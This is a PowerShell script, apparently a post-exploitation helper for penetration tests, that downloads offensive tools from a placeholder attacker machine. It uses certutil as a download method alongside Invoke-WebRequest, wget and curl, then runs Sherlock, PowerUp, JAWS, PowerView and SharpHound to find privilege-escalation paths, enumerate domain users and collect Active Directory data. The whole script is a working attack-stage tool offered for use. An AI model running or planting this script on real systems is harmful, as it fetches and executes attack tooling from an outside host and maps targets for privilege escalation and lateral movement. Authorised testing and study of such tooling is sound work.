$VerbosePreference = "Continue"

# Hardcoded paths and settings
$OutputFile = "C:\\Temp\\Shellshock\\shellshocks_security_checks.txt"
$ToolDownloadDir = "C:\\Temp\\Shellshock"
$AttackerMachine = "CHANGE_THIS_TO_YOUR_ATTACKING_MACHINE"  # Base URL of the attacker's machine

# Function: Ensure-Directory
function Ensure-Directory {
    param([string]$path)
    if (-Not (Test-Path $path)) {
        Write-Verbose "Directory $path does not exist. Creating it..."
        New-Item -Path $path -ItemType Directory | Out-Null
        Write-Host "Created directory: $path" -ForegroundColor Green
    } else {
        Write-Verbose "Directory $path already exists."
    }
}

# Ensure the directories for the script
Ensure-Directory -path $ToolDownloadDir

# Function: Transfer-Methods
function Transfer-Methods {
    param(
        [string]$url,
        [string]$filename,
        [string]$downloadMethod
    )

    if (Test-Path $filename) {
        Write-Host "$filename already exists, skipping download..." -ForegroundColor Green
        return $true
    }

    Write-Verbose "Starting download for $filename using method: $downloadMethod from $url..."

    switch ($downloadMethod) {
        "invokewebrequest" {
            try {
                Invoke-WebRequest -Uri $url -OutFile $filename -ErrorAction Stop
                Write-Host "$filename downloaded using Invoke-WebRequest." -ForegroundColor Green
                return $true
            } catch {
                Write-Host "Invoke-WebRequest failed." -ForegroundColor Red
            }
        }
        "wget" {
            try {
                wget $url -O $filename -ErrorAction Stop
                Write-Host "$filename downloaded using wget." -ForegroundColor Green
                return $true
            } catch {
                Write-Host "wget failed." -ForegroundColor Red
            }
        }
        "curl" {
            try {
                curl $url -o $filename -ErrorAction Stop
                Write-Host "$filename downloaded using curl." -ForegroundColor Green
                return $true
            } catch {
                Write-Host "curl failed." -ForegroundColor Red
            }
        }
        "certutil" {
            try {
                certutil.exe -urlcache -split -f $url $filename
                Write-Host "$filename downloaded using certutil." -ForegroundColor Green
                return $true
            } catch {
                Write-Host "certutil failed." -ForegroundColor Red
            }
        }
        default {
            Write-Host "Invalid download method specified for $filename." -ForegroundColor Red
            return $false
        }
    }

    Write-Verbose "Completed download attempt for $filename"
}

# Function: Extract-DomainName
function Extract-DomainName {
    $fqdn = whoami /fqdn
    $domainName = $fqdn -replace "^.*?DC=([^,]+),DC=([^,]+).*", '$1.$2'
    return $domainName
}

# Function: Run-Tool
function Run-Tool {
    param([hashtable]$toolConfig, [string]$outputFile)

    $scriptPath = "$ToolDownloadDir\$($toolConfig.Filename)"
    Write-Host "Running $($toolConfig.Name)..." -ForegroundColor Cyan
    Write-Verbose "Executing tool from $scriptPath..."

    $separator = "`n=====================================================`n"
    Add-Content -Path $outputFile -Value "$separator$($toolConfig.Name) results:$separator"

    switch ($toolConfig.Name) {
        "Sherlock" {
            . $scriptPath
            $result = Find-AllVulns 2>&1
        }
        "PowerUp" {
            . $scriptPath
            $result = Invoke-AllChecks 2>&1
        }
        "JAWS" {
            $result = & $scriptPath 2>&1
        }
        "PowerView" {
            . $scriptPath
            $result = Get-NetUser 2>&1
        }
        "SharpHound" {
            $domainName = Extract-DomainName
            $zipFileName = "$domainName.zip"
            Write-Host "Running SharpHound.exe with domain: $domainName and zip filename: $zipFileName"
            $result = & "$ToolDownloadDir\SharpHound.exe" --CollectionMethods All --zipfilename $zipFileName 2>&1
        }
        default {
            Write-Host "Unknown tool: $($toolConfig.Name)" -ForegroundColor Red
            return
        }
    }

    if (-not $result) {
        $result = "No output generated by $($toolConfig.Name)."
    }

    $result | Out-File -Append -FilePath $outputFile -Encoding UTF8
    Write-Host "$($toolConfig.Name) completed and output saved." -ForegroundColor Green
    Write-Verbose "Completed execution for $($toolConfig.Name)"
}

# Define the tools with their specific details
$tools = @(
    @{ Name = "Sherlock"; URL = "$AttackerMachine/Sherlock.ps1"; Filename = "Sherlock.ps1"; Execute = "module"; DownloadMethod = "certutil" },
    @{ Name = "PowerUp"; URL = "$AttackerMachine/PowerUp.ps1"; Filename = "PowerUp.ps1"; Execute = "module"; DownloadMethod = "certutil" },
    @{ Name = "JAWS"; URL = "$AttackerMachine/jaws-enum.ps1"; Filename = "jaws-enum.ps1"; Execute = "script"; DownloadMethod = "certutil" },
    @{ Name = "PowerView"; URL = "$AttackerMachine/PowerView.ps1"; Filename = "PowerView.ps1"; Execute = "script"; DownloadMethod = "certutil" },
    @{ Name = "SharpHound"; URL = "$AttackerMachine/SharpHound.exe"; Filename = "SharpHound.exe"; Execute = "sharphound"; DownloadMethod = "certutil" }
)

Write-Host "Starting security checks..." -ForegroundColor Cyan
Write-Verbose "Total tools to execute: $($tools.Count)"

$totalTools = $tools.Count
$currentTool = 0

Ensure-Directory -path $ToolDownloadDir

foreach ($tool in $tools) {
    $toolFile = "$ToolDownloadDir\$($tool.Filename)"
    Transfer-Methods -url $tool.URL -filename $toolFile -downloadMethod $tool.DownloadMethod
}

foreach ($tool in $tools) {
    $currentTool++
    Write-Progress -Activity "Running Tools" -Status "Running $($tool.Name)" -PercentComplete (($currentTool / $totalTools) * 100)
    Run-Tool -toolConfig $tool -outputFile $OutputFile
}

Write-Host "All security checks are complete. Results saved to $OutputFile." -ForegroundColor Green
